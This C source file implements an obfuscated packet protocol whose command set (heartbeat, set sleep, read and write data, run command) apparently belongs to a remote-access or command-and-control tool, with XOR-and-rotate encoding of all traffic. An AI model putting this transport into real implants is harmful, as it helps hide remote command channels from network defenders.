#include "protocol.h"
#include <stdio.h>
#include "platform.h"
#include <string.h>
#include <stdlib.h>

static const char XOR_KEY[] = {
    0x4A, 0x7F, 0x3C, 0x91,
    0xB2, 0x5E, 0xD8, 0x23,
    0x6F, 0xA4, 0x19, 0xE7,
    0x88, 0x2D, 0x55, 0xC3};
static const int XOR_KEY_LEN = 16;

char *rotate(char *data, int len, int shift)
{
    char *result = malloc(len);
    memcpy(result, data, len);
    for (int i = 0; i < len; i++)
    {
        result[i] = ((unsigned char)result[i] << shift) | ((unsigned char)result[i] >> (8 - shift));
    }
    return result;
}

char *xor_obfuscate(char *data, int len)
{
    char *result = malloc(len);
    memcpy(result, data, len);
    for (int i = 0; i < len; i++)
    {
        int xor_indice = i % XOR_KEY_LEN;
        result[i] = result[i] ^ XOR_KEY[xor_indice];
    }
    return result;
}

int send_header(Packet *packet, int fd)
{
    const int HEADER_BYTES = 12;
    int sent_bytes = 0;

    int header_data[3] = {packet->command_type, packet->request_id, packet->payload_len};
    char *data_as_char = (char *)header_data;

    char *obfuscated_xor = xor_obfuscate(data_as_char, 12);
    char *obfuscated_rotated = rotate(obfuscated_xor, 12, 3);
    free(obfuscated_xor);

    char *obfuscated_rotated_start = obfuscated_rotated;

    while (sent_bytes != HEADER_BYTES)
    {
        int remaining_bytes = HEADER_BYTES - sent_bytes;
        int bytes_this_call = send(fd, obfuscated_rotated, remaining_bytes, 0);

        if (bytes_this_call == -1)
        {
            free(obfuscated_rotated_start);
            return 0;
        }

        sent_bytes += bytes_this_call;
        obfuscated_rotated = obfuscated_rotated + bytes_this_call;
    }

    free(obfuscated_rotated_start);
    return 1;
}

char *recieve_bytes(int n, int fd)
{
    int recieved_bytes = 0;
    char *buffer = (char *)malloc(n);
    char *start_buffer = buffer;

    while (recieved_bytes != n)
    {
        int remaining_bytes = n - recieved_bytes;
        int bytes_this_call = recv(fd, buffer, remaining_bytes, 0);

        if (bytes_this_call == -1)
        {
            free(start_buffer);
            return NULL;
        }

        if (bytes_this_call == 0)
        {
            free(start_buffer);
            return NULL;
        }

        recieved_bytes += bytes_this_call;
        buffer = buffer + bytes_this_call;
    }

    return start_buffer;
}

Packet *recieve_packet(int fd)
{
    char *header_obfuscated = recieve_bytes(12, fd);

    if (header_obfuscated == NULL)
        return NULL;

    char *header_derotated = rotate(header_obfuscated, 12, 5);
    char *header = xor_obfuscate(header_derotated, 12);
    free(header_obfuscated);
    free(header_derotated);

    Packet *header_packet = (Packet *)header;

    Command command_type = header_packet->command_type;
    int request_id = header_packet->request_id;
    int payload_len = header_packet->payload_len;

    char *payload;
    free(header);

    if (payload_len == 0)
    {
        payload = NULL;
    }
    else
    {
        char *payload_obfuscated = recieve_bytes(payload_len, fd);

        if (payload_obfuscated == NULL)
            return NULL;

        char *payload_derotated = rotate(payload_obfuscated, payload_len, 5);
        payload = xor_obfuscate(payload_derotated, payload_len);
        free(payload_derotated);
        free(payload_obfuscated);
    }

    Packet *packet = malloc(sizeof(Packet));
    packet->command_type = command_type;
    packet->request_id = request_id;
    packet->payload_len = payload_len;
    packet->payload = payload;

    return packet;
}

int send_packet(Packet *packet, int fd)
{
    int result = send_header(packet, fd);

    if (result == 0)
        return 0;

    if (packet->payload_len == 0)
        return 1;

    int sent_bytes = 0;
    int payload_length = packet->payload_len;
    char *payload_ptr = packet->payload;

    char *obfuscated_payload_xor = xor_obfuscate(payload_ptr, payload_length);
    char *obfuscated_payload_rotated = rotate(obfuscated_payload_xor, payload_length, 3);
    free(obfuscated_payload_xor);
    char *obfuscated_payload_rotated_start = obfuscated_payload_rotated;

    while (sent_bytes != payload_length)
    {
        int remaining_bytes = payload_length - sent_bytes;
        int bytes_this_call = send(fd, obfuscated_payload_rotated, remaining_bytes, 0);

        if (bytes_this_call == -1)
        {
            free(obfuscated_payload_rotated_start);
            return 0;
        }

        sent_bytes += bytes_this_call;
        obfuscated_payload_rotated = obfuscated_payload_rotated + bytes_this_call;
    }

    free(obfuscated_payload_rotated_start);
    return 1;
}

void free_packet(Packet *packet)
{
    if (packet->payload_len != 0)
        free(packet->payload);
    free(packet);
}

char *map_enum_to_command_type(int command)
{
    char *mappings[] = {"COMMAND_HELLO",
                        "COMMAND_HEARTBEAT",
                        "COMMAND_SET_SLEEP",
                        "COMMAND_SHUTDOWN",
                        "COMMAND_READ_DATA",
                        "COMMAND_WRITE_DATA",
                        "COMMAND_RUN_CMD",
                        "COMMAND_ERROR",
                        "COMMAND_RESPONSE"};
    return mappings[command];
}

void print_packet_contents(Packet *packet)
{
    printf("\n+----------------------------------+\n");
    printf("| %-32s |\n", "RECEIVED PACKET");
    printf("+----------------------------------+\n");
    printf("| Command: %-23s |\n", map_enum_to_command_type(packet->command_type));
    printf("| Req ID:  %-23d |\n", packet->request_id);
    printf("| Pay Len: %-23d |\n", packet->payload_len);
    printf("+----------------------------------+\n");

    if (packet->payload_len == 0 || packet->payload == NULL)
    {
        printf("| Payload: %-23s |\n", "<NONE>");
        printf("+----------------------------------+\n\n");
    }
    else
    {
        printf("| %-32s |\n", "Payload: (see below)");
        printf("+----------------------------------+\n");
        printf("--- PAYLOAD BEGIN ---\n");
        printf("%.*s\n", packet->payload_len, packet->payload);
        printf("--- PAYLOAD END ---\n\n");
    }
}
